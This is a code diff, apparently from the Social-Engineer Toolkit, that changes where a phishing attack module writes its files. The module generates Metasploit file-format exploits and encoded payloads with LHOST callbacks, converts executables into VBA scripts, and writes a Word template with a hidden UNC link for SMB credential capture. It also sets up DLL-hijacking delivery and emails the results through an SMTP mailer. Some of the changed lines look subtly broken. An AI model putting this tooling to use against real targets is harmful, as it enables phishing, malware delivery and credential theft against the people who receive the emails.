@@ -166,9 +166,9 @@ if exploit_counter == 0:
     print_info("Generating fileformat exploit...")
     # START THE EXE TO VBA PAYLOAD
     if exploit != 'custom/exe/to/vba/payload':
-        outfile = "%s/src/program_junk/%s" % (definepath,outfile)
+        outfile = setdir + "/%s" % (outfile)
         subprocess.Popen("ruby %s/msfcli %s PAYLOAD=%s LHOST=%s LPORT=%s OUTPUTPATH=%s FILENAME=%s %s ENCODING=shikata_ga_nai %s E" % (meta_path,exploit,payload,rhost,lport,outpath,outfile,target,inputpdf), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
-        subprocess.Popen("cp " + users_home + "/.msf4/local/%s src/program_junk/" % (filename_code), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
+        subprocess.Popen("cp " + users_home + "/.msf4/local/%s %s" % (filename_code, setdir), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
         print_status("Payload creation complete.")
         time.sleep(1)
         print_status("All payloads get sent to the %s directory" % (outfile))
@@ -181,20 +181,20 @@ if exploit_counter == 0:
         if noencode == 1:
             execute1=("X")
             payloadname=("vb.exe")
-        subprocess.Popen("ruby %s/msfpayload %s %s %s ENCODING=shikata_ga_nai %s > src/program_junk/%s" % (meta_path,payload,rhost,lport,execute1,payloadname), shell=True).wait()
+        subprocess.Popen("ruby %s/msfpayload %s %s %s ENCODING=shikata_ga_nai %s > %s/%s" % (meta_path,payload,rhost,lport,execute1,setdir,payloadname), shell=True).wait()
         if noencode == 0:
-            subprocess.Popen("ruby %s/msfencode -e x86/shikata_ga_nai -i src/program_junk/vb1.exe -o src/program_junk/vb.exe -t exe -c 3" % (meta_path), shell=True).wait()
+            subprocess.Popen("ruby %s/msfencode -e x86/shikata_ga_nai -i %s/vb1.exe -o %s/vb.exe -t exe -c 3" % (meta_path,setdir,setdir), shell=True).wait()
         # Create the VB script here
-        subprocess.Popen("%s/tools/exe2vba.rb src/program_junk/vb.exe src/program_junk/template.vbs" % (meta_path), shell=True).wait()
+        subprocess.Popen("%s/tools/exe2vba.rb %s/vb.exe %s/template.vbs" % (meta_path,setdir,setdir), shell=True).wait()
         print_info("Raring the VBS file.")
-        subprocess.Popen("rar a src/program_junk/template.rar src/program_junk/template.vbs", shell=True).wait()
+        subprocess.Popen("rar a %s/template.rar %s/template.vbs" % (setdir,setdir), shell=True).wait()
 
     # NEED THIS TO PARSE DELIVERY OPTIONS TO SMTP MAILER
-    filewrite=file("src/program_junk/payload.options","w")
+    filewrite=file(setdir + "/payload.options","w")
     filewrite.write(payload+" "+rhost+" "+lport)
     filewrite.close()
     if exploit != "dll_hijacking":
-        if not os.path.isfile("src/program_junk/fileformat.file"):
+        if not os.path.isfile(setdir + "/fileformat.file"):
             sys.path.append("src/phishing/smtp/client/")
             debug_msg(me,"importing 'src.phishing.smtp.client.smtp_client'",1)
             try: reload(smtp_client)
@@ -209,11 +209,11 @@ if exploit == "unc_embed":
         letters=string.ascii_letters+string.digits
         return ''.join([random.choice(letters) for _ in range(length)])
     rand_gen=random_string()
-    filewrite=file("src/program_junk/unc_config", "w")
+    filewrite=file(setdir + "/unc_config", "w")
     filewrite.write("use server/capture/smb\n")
     filewrite.write("exploit -j\n\n")
     filewrite.close()
-    filewrite=file("src/program_junk/template.doc", "w")
+    filewrite=file(setdir + "/template.doc", "w")
     filewrite.write(r'''<html><head></head><body><img src="file://\\%s\%s.jpeg">''' %(rhost,rand_gen))
     filewrite.close()
     sys.path.append("src/phishing/smtp/client/")
@@ -235,28 +235,28 @@ if exploit == "dll_hijacking":
 
     # if we are not using apache
     if apache == 0:
-        if not os.path.isfile("%s/src/program_junk/fileformat.file" % (definepath)):
+        if not os.path.isfile("%s/fileformat.file" % (setdir)):
     #        try:
-            filewrite=file("src/program_junk/attack_vector","w")
+            filewrite=file(setdir + "/attack_vector","w")
             filewrite.write("hijacking")
             filewrite.close()
-            filewrite=file("src/program_junk/site.template","w")
+            filewrite=file(setdir + "/site.template","w")
             filewrite.write("TEMPLATE=CUSTOM")
             filewrite.close()
             time.sleep(1)
-            subprocess.Popen("mkdir src/program_junk/web_clone;cp src/html/msf.exe src/program_junk/web_clone/x", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+            subprocess.Popen("mkdir %s/web_clone;cp src/html/msf.exe %s/web_clone/x" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
             child=pexpect.spawn("python src/html/web_server.py")
     #        except: child.close()
     # if we are using apache
     if apache == 1:
         subprocess.Popen("cp src/html/msf.exe %s/x.exe" % (apache_path), shell=True).wait()
 
-    if os.path.isfile("src/program_junk/meta_config"):
+    if os.path.isfile(setdir + "/meta_config"):
         # if we aren't using the infectious method then do normal routine
-        if not os.path.isfile("%s/src/program_junk/fileformat.file" % (definepath)):
+        if not os.path.isfile(setdir + "/fileformat.file" % (setdir)):
             print_info("This may take a few to load MSF...")
             try:
-                child1=pexpect.spawn("ruby %s/msfconsole -L -n -r src/program_junk/meta_config" % (meta_path))
+                child1=pexpect.spawn("ruby %s/msfconsole -L -n -r %s/meta_config" % (meta_path,setdir))
             except:
                 try:
                     child1.close()
@@ -264,7 +264,7 @@ if exploit == "dll_hijacking":
 
     # get the emails out
     # if we aren't using the infectious method then do the normal routine
-    if not os.path.isfile("%s/src/program_junk/fileformat.file" % (definepath)):
+    if not os.path.isfile(setdir + "/fileformat.file" % (setdir)):
         sys.path.append("src/phishing/smtp/client/")
         debug_msg(me, "importing 'src.phishing.smtp.client.smtp_client'",1)
         try: reload(smtp_client)
